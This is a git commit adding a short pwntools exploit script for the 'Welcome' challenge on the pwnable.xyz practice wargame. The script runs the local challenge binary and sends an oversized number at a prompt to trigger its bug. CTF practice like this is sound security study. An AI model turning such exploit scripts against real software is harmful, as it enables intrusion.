5c2b6b0d2ebc3c8447cb9130d52f5799f68105d0
Jordi <sroot079@gmail.com>
2023-02-14 14:21:28 -0500

    add xyz
    to do

---
+++ pwnable.xyz/Welcome/image/challenge/exp.py
@@ -0,0 +1,16 @@
+#!/usr/bin/python3
+from pwn import *
+context.log_level='debug'
+context.arch='amd64'
+#context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
+p=process('./challenge')
+ru 		= lambda a: 	p.readuntil(a)
+r 		= lambda n:		p.read(n)
+sla 	= lambda a,b: 	p.sendlineafter(a,b)
+sa 		= lambda a,b: 	p.sendafter(a,b)
+sl		= lambda a: 	p.sendline(a)
+s 		= lambda a: 	p.send(a)
+# gdb.attach(p)
+sla(": ", b"9000000000000000000000000")
+
+p.interactive()
